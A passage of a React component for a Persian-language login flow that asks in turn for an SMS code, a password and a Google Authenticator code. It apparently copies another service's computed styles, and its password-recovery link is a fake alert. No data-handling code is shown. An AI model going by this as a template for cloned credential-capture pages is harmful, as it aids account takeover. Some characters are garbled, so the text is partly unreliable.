                      textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                    }}
                  >
                    ارسال مجدد پس از {countdown} ثانیه
                  </span>
                ) : (
                  <>
                    <span
                      style={{
                        borderColor: "rgba(0, 0, 0, 0.6)",
                        color: "rgba(0, 0, 0, 0.6)",
                        display: "inline",
                        fontSize: "14px",
                        lineHeight: "24.01px",
                        outlineColor: "rgba(0, 0, 0, 0.6)",
                        textDecorationColor: "rgba(0, 0, 0, 0.6)",
                        textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                        marginLeft: "8px",
                      }}
                    >
                      کد ��ا ��ریافت نکردید؟
                    </span>
                    <button
                      tabIndex={0}
                      type="button"
                      onClick={() => setCountdown(60)}
                      style={{
                        alignItems: "center",
                        borderBottomLeftRadius: "8px",
                        borderBottomRightRadius: "8px",
                        borderRadius: "8px",
                        borderTopLeftRadius: "8px",
                        borderTopRightRadius: "8px",
                        color: "rgb(0, 122, 255)",
                        cursor: "pointer",
                        display: "inline-flex",
                        fontSize: "14px",
                        fontWeight: "500",
                        justifyContent: "center",
                        lineHeight: "24.01px",
                        outlineColor: "rgb(0, 122, 255)",
                        paddingBottom: "4px",
                        paddingLeft: "8px",
                        paddingRight: "8px",
                        paddingTop: "4px",
                        position: "relative",
                        textAlign: "center",
                        textDecorationColor: "rgb(0, 122, 255)",
                        textEmphasisColor: "rgb(0, 122, 255)",
                        textTransform: "uppercase",
                        transitionBehavior: "normal, normal, normal",
                        transitionDelay: "0s, 0s, 0s",
                        transitionDuration: "0.25s, 0.25s, 0.25s",
                        transitionProperty: "background-color, box-shadow, border-color",
                        transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                        userSelect: "none",
                        verticalAlign: "middle",
                        backgroundColor: "rgba(0, 0, 0, 0)",
                        border: "none",
                      }}
                    >
                      ارسال مجدد
                    </button>
                  </>
                )}
              </div>

              {/* Action Buttons */}
              <div style={{ marginTop: "32px" }}>
                <hr
                  style={{
                    borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
                    borderBottomStyle: "solid",
                    borderBottomWidth: "1px",
                    borderColor: "rgba(0, 0, 0, 0.2)",
                    borderLeftStyle: "solid",
                    borderRightStyle: "solid",
                    borderStyle: "solid",
                    borderTopStyle: "solid",
                    flexShrink: "0",
                    marginBottom: "16px",
                    marginLeft: "-16px",
                    marginRight: "-16px",
                    overflowX: "hidden",
                    overflowY: "hidden",
                  }}
                />
                <div
                  style={{
                    display: "flex",
                    gap: "12px",
                    gridGap: "12px",
                    gridRowGap: "12px",
                    rowGap: "12px",
                  }}
                >
                  <button
                    tabIndex={0}
                    type="button"
                    onClick={handleVerifyCodeSubmit}
                    disabled={isSubmitting || verifyCode.length !== 6}
                    style={{
                      alignItems: "center",
                      backgroundColor: "rgb(0, 122, 255)",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderColor: "rgb(255, 255, 255)",
                      borderRadius: "8px",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      color: "rgb(255, 255, 255)",
                      cursor: isSubmitting || verifyCode.length !== 6 ? "not-allowed" : "pointer",
                      display: "flex",
                      fontWeight: "500",
                      justifyContent: "center",
                      paddingBottom: "10px",
                      paddingLeft: "16px",
                      paddingRight: "16px",
                      paddingTop: "10px",
                      position: "relative",
                      textAlign: "center",
                      textTransform: "uppercase",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.25s, 0.25s, 0.25s",
                      transitionProperty: "background-color, box-shadow, border-color",
                      transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                      userSelect: "none",
                      verticalAlign: "middle",
                      width: "100%",
                      border: "none",
                      opacity: isSubmitting || verifyCode.length !== 6 ? "0.5" : "1",
                    }}
                  >
                    {isSubmitting ? (
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                        }}
                      >
                        <Loader2
                          style={{
                            width: "16px",
                            height: "16px",
                            marginLeft: "8px",
                            animation: "spin 1s linear infinite",
                          }}
                        />
                        <span>در حال تایید...</span>
                      </div>
                    ) : (
                      <>
                        <span
                          style={{
                            borderColor: "rgb(255, 255, 255)",
                            color: "rgb(255, 255, 255)",
                            cursor: "pointer",
                            display: "contents",
                            fontWeight: "500",
                            outlineColor: "rgb(255, 255, 255)",
                            textAlign: "center",
                            textDecorationColor: "rgb(255, 255, 255)",
                            textEmphasisColor: "rgb(255, 255, 255)",
                            textTransform: "uppercase",
                            userSelect: "none",
                          }}
                        />
                        <span>ثبت و ادامه</span>
                      </>
                    )}
                  </button>
                </div>
              </div>
            </>
          )}

          {/* Step 3: Loading */}
          {currentStep === "loading" && renderLoading()}

          {/* Step 4: Password Authentication */}
          {currentStep === "password" && (
            <>
              <h5
                style={{
                  fontSize: "20px",
                  fontWeight: "700",
                  lineHeight: "28px",
                  marginBottom: "12px",
                  textAlign: "center",
                }}
              >
                رمز عبور را وارد کنید
              </h5>
              <form onSubmit={handlePasswordSubmit}>
                {/* Password Input */}
                <div
                  style={{
                    display: "inline-flex",
                    flexDirection: "column",
                    marginBottom: "8px",
                    position: "relative",
                    verticalAlign: "top",
                    width: "100%",
                  }}
                >
                  <label
                    htmlFor="password-input"
                    style={{
                      cursor: "default",
                      fontSize: "14px",
                      fontWeight: "500",
                      lineHeight: "24.01px",
                      marginBottom: "4px",
                      maxWidth: "calc(133% - 32px)",
                      overflowX: "hidden",
                      overflowY: "hidden",
                      position: "relative",
                      right: "0px",
                      textOverflow: "ellipsis",
                      textWrap: "nowrap",
                      top: "0px",
                      transformOrigin: "100% 0%",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.2s, 0.2s, 0.2s",
                      transitionProperty: "color, transform, max-width",
                      transitionTimingFunction:
                        "cubic-bezier(0, 0, 0.2, 1), cubic-bezier(0, 0, 0.2, 1), cubic-bezier(0, 0, 0.2, 1)",
                      userSelect: "none",
                      whiteSpace: "nowrap",
                      zIndex: "1",
                      textAlign: "right",
                      color: "rgb(0, 0, 0)",
                    }}
                  >
                    رمز عبور حساب را وارد کنید.
                  </label>
                  <div
                    style={{
                      alignItems: "center",
                      backgroundColor: "rgb(245, 246, 247)",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderRadius: "8px",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      cursor: "text",
                      display: "flex",
                      paddingLeft: "12px",
                      position: "relative",
                      width: "100%",
                    }}
                  >
                    <input
                      id="password-input"
                      aria-invalid="false"
                      name="password"
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        if (errors.password) {
                          setErrors((prev) => ({
                            ...prev,
                            password: undefined,
                          }));
                        }
                      }}
                      autoFocus
                      disabled={isSubmitting}
                      style={{
                        animation:
                          "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
                        animationDuration: "0.01s",
                        animationName: "mui-auto-fill-cancel",
                        appearance: "auto",
                        boxSizing: "content-box",
                        cursor: "text",
                        direction: "ltr",
                        fontFeatureSettings: '"ss00"',
                        overflowX: "clip",
                        overflowY: "clip",
                        paddingBottom: "10px",
                        paddingLeft: "12px",
                        paddingRight: "12px",
                        paddingTop: "10px",
                        textAlign: "right",
                        width: "100%",
                        border: "none",
                        outline: "none",
                        fontSize: "14px",
                      }}
                    />
                    <div
                      style={{
                        alignItems: "center",
                        borderColor: "rgba(0, 0, 0, 0.6)",
                        color: "rgba(0, 0, 0, 0.6)",
                        cursor: "text",
                        display: "flex",
                        maxHeight: "32px",
                        outlineColor: "rgba(0, 0, 0, 0.6)",
                        textDecorationColor: "rgba(0, 0, 0, 0.6)",
                        textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                        textWrap: "nowrap",
                        whiteSpace: "nowrap",
                      }}
                    >
                      <button
                        tabIndex={0}
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        style={{
                          alignItems: "center",
                          borderBottomLeftRadius: "50%",
                          borderBottomRightRadius: "50%",
                          borderColor: "rgba(0, 0, 0, 0.6)",
                          borderRadius: "50%",
                          borderTopLeftRadius: "50%",
                          borderTopRightRadius: "50%",
                          color: "rgba(0, 0, 0, 0.6)",
                          cursor: "pointer",
                          display: "flex",
                          flexShrink: "0",
                          fontSize: "24px",
                          justifyContent: "center",
                          lineHeight: "42px",
                          marginLeft: "-8px",
                          outlineColor: "rgba(0, 0, 0, 0.6)",
                          paddingBottom: "8px",
                          paddingLeft: "8px",
                          paddingRight: "8px",
                          paddingTop: "8px",
                          position: "relative",
                          textAlign: "center",
                          textDecorationColor: "rgba(0, 0, 0, 0.6)",
                          textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                          textWrap: "nowrap",
                          transitionDuration: "0.15s",
                          transitionProperty: "background-color",
                          transitionTimingFunction:
                            "cubic-bezier(0.4, 0, 0.2, 1)",
                          userSelect: "none",
                          verticalAlign: "middle",
                          whiteSpace: "nowrap",
                          backgroundColor: "rgba(0, 0, 0, 0)",
                          border: "none",
                        }}
                      >
                        {showPassword ? (
                          <svg
                            xmlns="http://www.w3.org/2000/svg"
                            width="24"
                            height="24"
                            fill="none"
                            focusable="false"
                            aria-hidden="true"
                            viewBox="0 0 24 24"
                            style={{
                              borderColor: "rgba(0, 0, 0, 0.6)",
                              color: "rgba(0, 0, 0, 0.6)",
                              cursor: "pointer",
                              fill: "rgba(0, 0, 0, 0.6)",
                              flexShrink: "0",
                              fontSize: "24px",
                              height: "24px",
                              lineHeight: "42px",
                              outlineColor: "rgba(0, 0, 0, 0.6)",
                              overflowClipMargin: "content-box",
                              overflowX: "hidden",
                              overflowY: "hidden",
                              textAlign: "center",
                              textDecorationColor: "rgba(0, 0, 0, 0.6)",
                              textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                              textWrap: "nowrap",
                              transitionDuration: "0.2s",
                              transitionProperty: "fill",
                              transitionTimingFunction:
                                "cubic-bezier(0.4, 0, 0.2, 1)",
                              userSelect: "none",
                              whiteSpace: "nowrap",
                              width: "24px",
                            }}
                          >
                            <path
                              fill="currentColor"
                              fillRule="evenodd"
                              d="M22.53 2.53a.75.75 0 0 0-1.06-1.06l-3.49 3.489C16.184 3.685 14.135 2.98 12 2.98c-3.848 0-7.352 2.269-9.743 6.027-.545.854-.792 1.949-.792 2.998s.247 2.144.792 2.998a15.2 15.2 0 0 0 2.583 3.096l-3.37 3.37a.75.75 0 1 0 1.06 1.061l7.468-7.467.002-.003L15.06 10l.003-.002zm-8.046 5.925 2.419-2.418C15.388 5.019 13.713 4.48 12 4.48c-3.212 0-6.288 1.891-8.477 5.333-.355.556-.558 1.351-.558 2.192 0 .84.203 1.636.557 2.191a13.7 13.7 0 0 0 2.38 2.841l2.553-2.553a4.326 4.326 0 0 1 6.03-6.03M9.17 12a2.826 2.826 0 0 1 4.229-2.46L9.54 13.4a2.8 2.8 0 0 1-.37-1.4"
                              clipRule="evenodd"
                            ></path>
                            <path
                              fill="currentColor"
                              d="M19.58 7.346a.75.75 0 0 1 1.054.114c.384.477.761.99 1.11 1.538.544.854.791 1.948.791 2.997s-.247 2.144-.793 2.998c-2.39 3.758-5.894 6.027-9.742 6.027a10 10 0 0 1-3.871-.799.75.75 0 1 1 .582-1.382A8.5 8.5 0 0 0 12 19.52c3.212 0 6.288-1.891 8.477-5.332v-.002c.355-.555.558-1.35.558-2.191s-.203-1.636-.557-2.191l-.001-.002A16 16 0 0 0 19.466 8.4a.75.75 0 0 1 .114-1.054"
                            ></path>
                            <path
                              fill="currentColor"
                              d="M16.248 12.836a.75.75 0 0 0-1.476-.272 2.815 2.815 0 0 1-2.218 2.218.75.75 0 0 0 .272 1.476 4.315 4.315 0 0 0 3.422-3.422"
                            ></path>
                          </svg>
                        ) : (
                          <svg
                            xmlns="http://www.w3.org/2000/svg"
                            width="24"
                            height="24"
                            fill="none"
                            focusable="false"
                            aria-hidden="true"
                            viewBox="0 0 24 24"
                            style={{
                              borderColor: "rgba(0, 0, 0, 0.6)",
                              color: "rgba(0, 0, 0, 0.6)",
                              cursor: "pointer",
                              fill: "rgba(0, 0, 0, 0.6)",
                              flexShrink: "0",
                              fontSize: "24px",
                              height: "24px",
                              lineHeight: "42px",
                              outlineColor: "rgba(0, 0, 0, 0.6)",
                              overflowClipMargin: "content-box",
                              overflowX: "hidden",
                              overflowY: "hidden",
                              textAlign: "center",
                              textDecorationColor: "rgba(0, 0, 0, 0.6)",
                              textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                              textWrap: "nowrap",
                              transitionDuration: "0.2s",
                              transitionProperty: "fill",
                              transitionTimingFunction:
                                "cubic-bezier(0.4, 0, 0.2, 1)",
                              userSelect: "none",
                              whiteSpace: "nowrap",
                              width: "24px",
                            }}
                          >
                            <path
                              fill="currentColor"
                              d="M12 4.5C7.305 4.5 3.17 7.255 1.178 11.5a.75.75 0 0 0 0 1c1.992 4.245 6.127 7 10.822 7s8.83-2.755 10.822-7a.75.75 0 0 0 0-1C20.83 7.255 16.695 4.5 12 4.5M12 17c-3.948 0-7.425-2.278-9.17-5.5C4.575 8.278 8.052 6 12 6s7.425 2.278 9.17 5.5C19.425 14.722 15.948 17 12 17"
                            ></path>
                            <path
                              fill="currentColor"
                              d="M12 8.5a3.5 3.5 0 1 0 0 7 3.5 3.5 0 0 0 0-7M10 12a2 2 0 1 1 4 0 2 2 0 0 1-4 0"
                            ></path>
                          </svg>
                        )}
                      </button>
                    </div>
                    <fieldset
                      aria-hidden="true"
                      style={{
                        borderBottomLeftRadius: "8px",
                        borderBottomRightRadius: "8px",
                        borderBottomStyle: "solid",
                        borderBottomWidth: "1px",
                        borderBottomColor: errors.password
                          ? "rgb(220, 38, 38)"
                          : "rgba(0, 0, 0, 0.2)",
                        borderLeftStyle: "solid",
                        borderLeftWidth: "1px",
                        borderLeftColor: errors.password
                          ? "rgb(220, 38, 38)"
                          : "rgba(0, 0, 0, 0.2)",
                        borderRadius: "8px",
                        borderRightStyle: "solid",
                        borderRightWidth: "1px",
                        borderRightColor: errors.password
                          ? "rgb(220, 38, 38)"
                          : "rgba(0, 0, 0, 0.2)",
                        borderTopLeftRadius: "8px",
                        borderTopRightRadius: "8px",
                        borderTopStyle: "solid",
                        borderTopWidth: "1px",
                        borderTopColor: errors.password
                          ? "rgb(220, 38, 38)"
                          : "rgba(0, 0, 0, 0.2)",
                        bottom: "0px",
                        cursor: "text",
                        left: "0px",
                        minWidth: "0%",
                        overflowX: "hidden",
                        overflowY: "hidden",
                        paddingLeft: "8px",
                        paddingRight: "8px",
                        pointerEvents: "none",
                        position: "absolute",
                        right: "0px",
                        textAlign: "right",
                        top: "-5px",
                      }}
                    >
                      <legend
                        style={{
                          cursor: "text",
                          fontSize: "12px",
                          height: "11px",
                          lineHeight: "21px",
                          maxWidth: "0.01px",
                          overflowX: "hidden",
                          overflowY: "hidden",
                          pointerEvents: "none",
                          textAlign: "right",
                          textWrap: "nowrap",
                          transitionDuration: "0.05s",
                          transitionProperty: "max-width",
                          transitionTimingFunction:
                            "cubic-bezier(0, 0, 0.2, 1)",
                          visibility: "hidden",
                          whiteSpace: "nowrap",
                        }}
                      >
                        <span
                          style={{
                            cursor: "text",
                            display: "inline-block",
                            fontSize: "12px",
                            lineHeight: "21px",
                            opacity: "0",
                            paddingLeft: "5px",
                            paddingRight: "5px",
                            pointerEvents: "none",
                            textAlign: "right",
                            textWrap: "nowrap",
                            whiteSpace: "nowrap",
                          }}
                        >
                          رمز عبور حساب را وارد کنید.
                        </span>
                      </legend>
                    </fieldset>
                  </div>
                  {errors.password && (
                    <p
                      style={{
                        color: "rgb(220, 38, 38)",
                        fontSize: "12px",
                        textAlign: "right",
                        marginTop: "4px",
                      }}
                    >
                      {errors.password}
                    </p>
                  )}
                </div>

                {/* Forgot Password Link */}
                <div
                  style={{
                    display: "flex",
                    gap: "8px",
                    marginBottom: "24px",
                  }}
                >
                  <p
                    style={{
                      fontSize: "14px",
                      lineHeight: "24.01px",
                      margin: "0",
                      color: "rgb(0, 0, 0)",
                    }}
                  >
                    رمز عبور را فراموش کرده‌اید؟
                  </p>
                  <a
                    href="#"
                    onClick={(e) => {
                      e.preventDefault();
                      alert(
                        "لینک بازیابی رمز عبور به ایمیل شما ارسال خواهد شد.",
                      );
                    }}
                    style={{
                      borderColor: "rgb(0, 122, 255)",
                      color: "rgb(0, 122, 255)",
                      cursor: "pointer",
                      fontSize: "14px",
                      fontWeight: "500",
                      lineHeight: "24.01px",
                      outlineColor: "rgb(0, 122, 255)",
                      textDecorationColor: "rgb(0, 122, 255)",
                      textEmphasisColor: "rgb(0, 122, 255)",
                      textDecoration: "none",
                    }}
                  >
                    بازیابی رمز عبور
                  </a>
                </div>

                {/* Submit Section */}
                <div style={{ marginTop: "8px" }}>
                  <hr
                    style={{
                      borderBottomStyle: "solid",
                      borderBottomWidth: "1px",
                      borderBottomColor: "rgba(0, 0, 0, 0.2)",
                      borderLeftStyle: "solid",
                      borderLeftWidth: "0",
                      borderLeftColor: "rgba(0, 0, 0, 0.2)",
                      borderRightStyle: "solid",
                      borderRightWidth: "0",
                      borderRightColor: "rgba(0, 0, 0, 0.2)",
                      borderTopStyle: "solid",
                      borderTopWidth: "0",
                      borderTopColor: "rgba(0, 0, 0, 0.2)",
                      flexShrink: "0",
                      marginBottom: "8px",
                      marginLeft: "-20px",
                      marginRight: "-20px",
                      overflowX: "hidden",
                      overflowY: "hidden",
                    }}
                  />
                  <button
                    tabIndex={0}
                    type="submit"
                    disabled={isSubmitting}
                    style={{
                      alignItems: "center",
                      backgroundColor: "rgb(23, 29, 38)",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderColor: "rgb(255, 255, 255)",
                      borderRadius: "8px",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      color: "rgb(255, 255, 255)",
                      cursor: isSubmitting ? "not-allowed" : "pointer",
                      display: "inline-flex",
                      fontWeight: "500",
                      justifyContent: "center",
                      outlineColor: "rgb(255, 255, 255)",
                      paddingBottom: "10px",
                      paddingLeft: "16px",
                      paddingRight: "16px",
                      paddingTop: "10px",
                      position: "relative",
                      textAlign: "center",
                      textDecorationColor: "rgb(255, 255, 255)",
                      textEmphasisColor: "rgb(255, 255, 255)",
                      textTransform: "uppercase",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.25s, 0.25s, 0.25s",
                      transitionProperty:
                        "background-color, box-shadow, border-color",
                      transitionTimingFunction:
                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                      userSelect: "none",
                      verticalAlign: "middle",
                      width: "100%",
                      border: "none",
                      fontSize: "14px",
                      opacity: isSubmitting ? "0.5" : "1",
                    }}
                  >
                    {isSubmitting ? (
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                        }}
                      >
                        <Loader2
                          style={{
                            width: "16px",
                            height: "16px",
                            marginLeft: "8px",
                            animation: "spin 1s linear infinite",
                          }}
                        />
                        <span>در حال بررسی...</span>
                      </div>
                    ) : (
                      <>
                        <span
                          style={{
                            borderColor: "rgb(255, 255, 255)",
                            color: "rgb(255, 255, 255)",
                            cursor: "pointer",
                            display: "contents",
                            fontWeight: "500",
                            outlineColor: "rgb(255, 255, 255)",
                            textAlign: "center",
                            textDecorationColor: "rgb(255, 255, 255)",
                            textEmphasisColor: "rgb(255, 255, 255)",
                            textTransform: "uppercase",
                            userSelect: "none",
                          }}
                        />
                        <span>ثبت و ورود به حساب</span>
                        <span
                          style={{
                            borderBottomLeftRadius: "8px",
                            borderBottomRightRadius: "8px",
                            borderColor: "rgb(255, 255, 255)",
                            borderRadius: "8px",
                            borderTopLeftRadius: "8px",
                            borderTopRightRadius: "8px",
                            bottom: "0px",
                            color: "rgb(255, 255, 255)",
                            cursor: "pointer",
                            fontWeight: "500",
                            left: "0px",
                            outlineColor: "rgb(255, 255, 255)",
                            overflowX: "hidden",
                            overflowY: "hidden",
                            pointerEvents: "none",
                            position: "absolute",
                            right: "0px",
                            textAlign: "center",
                            textDecorationColor: "rgb(255, 255, 255)",
                            textEmphasisColor: "rgb(255, 255, 255)",
                            textTransform: "uppercase",
                            top: "0px",
                            userSelect: "none",
                            zIndex: "0",
                          }}
                        />
                      </>
                    )}
                  </button>
                </div>
              </form>
            </>
          )}

          {/* Step 5: Google Authenticator */}
          {currentStep === "google" && (
            <>
              <h5
                style={{
                  fontSize: "20px",
                  fontWeight: "700",
                  lineHeight: "28px",
                  marginBottom: "12px",
                  textAlign: "center",
                }}
              >
                کد Google Authenticator را وارد کنید
              </h5>
              {/* Alert Message */}
              <div
                role="alert"
                style={{
                  backgroundColor: "rgba(0, 122, 255, 0.05)",
                  borderBottomLeftRadius: "8px",
                  borderBottomRightRadius: "8px",
                  borderColor: "rgb(0, 122, 255)",
                  borderRadius: "8px",
                  borderTopLeftRadius: "8px",
                  borderTopRightRadius: "8px",
                  color: "rgb(0, 122, 255)",
                  display: "flex",
                  fontSize: "12px",
                  lineHeight: "20.004px",
                  outlineColor: "rgb(0, 122, 255)",
                  paddingBottom: "12px",
                  paddingLeft: "12px",
                  paddingRight: "12px",
                  paddingTop: "12px",
                  textDecorationColor: "rgb(0, 122, 255)",
                  textEmphasisColor: "rgb(0, 122, 255)",
                  transitionDuration: "0.3s",
                  transitionProperty: "box-shadow",
                  transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                  width: "100%",
                  border: "1px solid rgb(0, 122, 255)",
                }}
              >
                <div
                  style={{
                    borderColor: "rgb(0, 122, 255)",
                    color: "rgb(0, 122, 255)",
                    display: "flex",
                    fontSize: "22px",
                    lineHeight: "36.674px",
                    marginLeft: "8px",
                    opacity: "0.9",
                    outlineColor: "rgb(0, 122, 255)",
                    textDecorationColor: "rgb(0, 122, 255)",
                    textEmphasisColor: "rgb(0, 122, 255)",
                  }}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    fill="none"
                    style={{
                      borderColor: "rgb(0, 122, 255)",
                      color: "rgb(0, 122, 255)",
                      fill: "none",
                      fontSize: "22px",
                      height: "24px",
                      lineHeight: "36.674px",
                      outlineColor: "rgb(0, 122, 255)",
                      overflowClipMargin: "content-box",
                      overflowX: "hidden",
                      overflowY: "hidden",
                      textDecorationColor: "rgb(0, 122, 255)",
                      textEmphasisColor: "rgb(0, 122, 255)",
                      width: "24px",
                    }}
                  >
                    <path
                      fill="currentColor"
                      fillRule="evenodd"
                      d="M12 2.5c-5.238 0-9.5 4.261-9.5 9.5s4.262 9.5 9.5 9.5 9.5-4.262 9.5-9.5-4.262-9.5-9.5-9.5"
                      clipRule="evenodd"
                      opacity="0.2"
                    ></path>
                    <path
                      fill="currentColor"
                      d="M12.747 8.291a.75.75 0 0 0-1.5 0v.063a.75.75 0 0 0 1.5 0zM12.753 11.394a.75.75 0 0 0-1.5 0v4.3a.75.75 0 0 0 1.5 0z"
                    ></path>
                  </svg>
                </div>
                <div
                  style={{
                    borderColor: "rgb(0, 122, 255)",
                    color: "rgb(0, 122, 255)",
                    flexGrow: "1",
                    fontSize: "14px",
                    lineHeight: "24.01px",
                    outlineColor: "rgb(0, 122, 255)",
                    overflowX: "auto",
                    overflowY: "auto",
                    textDecorationColor: "rgb(0, 122, 255)",
                    textEmphasisColor: "rgb(0, 122, 255)",
                  }}
                >
                  <div
                    style={{
                      alignItems: "flex-start",
                      borderColor: "rgb(0, 122, 255)",
                      color: "rgb(0, 122, 255)",
                      display: "flex",
                      fontSize: "14px",
                      justifyContent: "space-between",
                      lineHeight: "24.01px",
                      outlineColor: "rgb(0, 122, 255)",
                      textDecorationColor: "rgb(0, 122, 255)",
                      textEmphasisColor: "rgb(0, 122, 255)",
                    }}
                  >
                    <div
                      style={{
                        borderColor: "rgb(0, 122, 255)",
                        color: "rgb(0, 122, 255)",
                        fontSize: "14px",
                        lineHeight: "24.01px",
                        outlineColor: "rgb(0, 122, 255)",
                        textDecorationColor: "rgb(0, 122, 255)",
                        textEmphasisColor: "rgb(0, 122, 255)",
                      }}
                    >
                      کد ۶ رقمی Google Authenticator خود را وارد کنید.
                    </div>
                  </div>
                  <div
                    style={{
                      alignItems: "center",
                      borderColor: "rgb(0, 122, 255)",
                      color: "rgb(0, 122, 255)",
                      display: "flex",
                      fontSize: "14px",
                      lineHeight: "24.01px",
                      outlineColor: "rgb(0, 122, 255)",
                      textDecorationColor: "rgb(0, 122, 255)",
                      textEmphasisColor: "rgb(0, 122, 255)",
                    }}
                  />
                </div>
              </div>

              {/* 6 Separate OTP Inputs */}
              <div
                style={{
                  direction: "ltr",
                  display: "flex",
                  flexFlow: "row wrap",
                  flexWrap: "wrap",
                  marginRight: "-8px",
                  marginTop: "4px",
                  width: "calc(100% + 8px)",
                }}
              >
                {[0, 1, 2, 3, 4, 5].map((index) => (
                  <div
                    key={index}
                    style={{
                      direction: "ltr",
                      flexBasis: "0px",
                      flexGrow: "1",
                      maxWidth: "100%",
                      paddingRight: "8px",
                      paddingTop: "8px",
                    }}
                  >
                    <div
                      style={{
                        direction: "ltr",
                        display: "inline-flex",
                        flexDirection: "column",
                        flexFlow: "column nowrap",
                        marginBottom: "4px",
                        marginTop: "8px",
                        position: "relative",
                        verticalAlign: "top",
                        width: "100%",
                      }}
                    >
                      <div
                        style={{
                          alignItems: "center",
                          backgroundColor: "rgb(245, 246, 247)",
                          borderBottomLeftRadius: "8px",
                          borderBottomRightRadius: "8px",
                          borderRadius: "8px",
                          borderTopLeftRadius: "8px",
                          borderTopRightRadius: "8px",
                          cursor: "text",
                          direction: "ltr",
                          display: "flex",
                          marginBottom: "16px",
                          position: "relative",
                          textAlign: "center",
                          width: "100%",
                        }}
                      >
                        <input
                          aria-invalid="false"
                          type="tel"
                          maxLength={1}
                          value={googleCode[index] || ""}
                          onChange={(e) => {
                            const newValue = e.target.value;
                            if (newValue.match(/^[0-9]*$/)) {
                              const newCode = googleCode.split("");
                              newCode[index] = newValue;
                              setGoogleCode(newCode.join(""));

                              // Auto focus next input
                              if (newValue && index < 5) {
                                const nextInput = document.querySelector(
                                  `input[data-google-index="${index + 1}"]`,
                                ) as HTMLInputElement;
                                if (nextInput) nextInput.focus();
                              }
                            }
                          }}
                          onKeyDown={(e) => {
                            if (
                              e.key === "Backspace" &&
                              !googleCode[index] &&
                              index > 0
                            ) {
                              const prevInput = document.querySelector(
                                `input[data-google-index="${index - 1}"]`,
                              ) as HTMLInputElement;
                              if (prevInput) prevInput.focus();
                            }
                          }}
                          data-google-index={index}
                          disabled={isSubmitting}
                          style={{
                            animation:
                              "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
                            animationDuration: "0.01s",
                            animationName: "mui-auto-fill-cancel",
                            appearance: "auto",
                            boxSizing: "content-box",
                            cursor: "text",
                            direction: "ltr",
                            overflowX: "clip",
                            overflowY: "clip",
                            paddingBottom: "10px",
                            paddingLeft: "12px",
                            paddingRight: "12px",
                            paddingTop: "10px",
                            textAlign: "center",
                            width: "100%",
                            border: "none",
                            outline: "none",
                            fontSize: "16px",
                            fontWeight: "500",
                            backgroundColor: "rgb(245, 246, 247)",
                          }}
                        />
                        <fieldset
                          aria-hidden="true"
                          style={{
                            borderBottomLeftRadius: "8px",
                            borderBottomRightRadius: "8px",
                            borderBottomStyle: "solid",
                            borderBottomWidth: "1px",
                            borderBottom: "1px solid rgba(0, 0, 0, 0)",
                            borderBottomColor: "rgba(0, 0, 0, 0)",
                            borderLeft: "1px solid rgba(0, 0, 0, 0)",
                            borderLeftStyle: "solid",
                            borderLeftWidth: "1px",
                            borderLeftColor: "rgba(0, 0, 0, 0)",
                            borderRadius: "8px",
                            borderRight: "1px solid rgba(0, 0, 0, 0)",
                            borderRightStyle: "solid",
                            borderRightWidth: "1px",
                            borderRightColor: "rgba(0, 0, 0, 0)",
                            borderTopLeftRadius: "8px",
                            borderTopRightRadius: "8px",
                            borderTop: "1px solid rgba(0, 0, 0, 0)",
                            borderTopStyle: "solid",
                            borderTopWidth: "1px",
                            borderTopColor: "rgba(0, 0, 0, 0)",
                            bottom: "0px",
                            cursor: "text",
                            direction: "ltr",
                            left: "0px",
                            minWidth: "0%",
                            overflowX: "hidden",
                            overflowY: "hidden",
                            paddingLeft: "8px",
                            paddingRight: "8px",
                            pointerEvents: "none",
                            position: "absolute",
                            right: "0px",
                            textAlign: "right",
                            top: "-5px",
                          }}
                        >
                          <legend
                            style={{
                              cursor: "text",
                              direction: "ltr",
                              lineHeight: "11px",
                              overflowX: "hidden",
                              overflowY: "hidden",
                              pointerEvents: "none",
                              textAlign: "right",
                              transitionDuration: "0.15s",
                              transitionProperty: "width",
                              transitionTimingFunction:
                                "cubic-bezier(0, 0, 0.2, 1)",
                            }}
                          >
                            <span
                              aria-hidden="true"
                              style={{
                                cursor: "text",
                                direction: "ltr",
                                display: "inline",
                                lineHeight: "11px",
                                pointerEvents: "none",
                                textAlign: "right",
                              }}
                            >
                              ���
                            </span>
                          </legend>
                        </fieldset>
                      </div>
                    </div>
                  </div>
                ))}
              </div>

              {errors.googleCode && (
                <p
                  style={{
                    color: "rgb(220, 38, 38)",
                    fontSize: "12px",
                    textAlign: "right",
                    marginTop: "4px",
                  }}
                >
                  {errors.googleCode}
                </p>
              )}

              {/* Submit Button */}
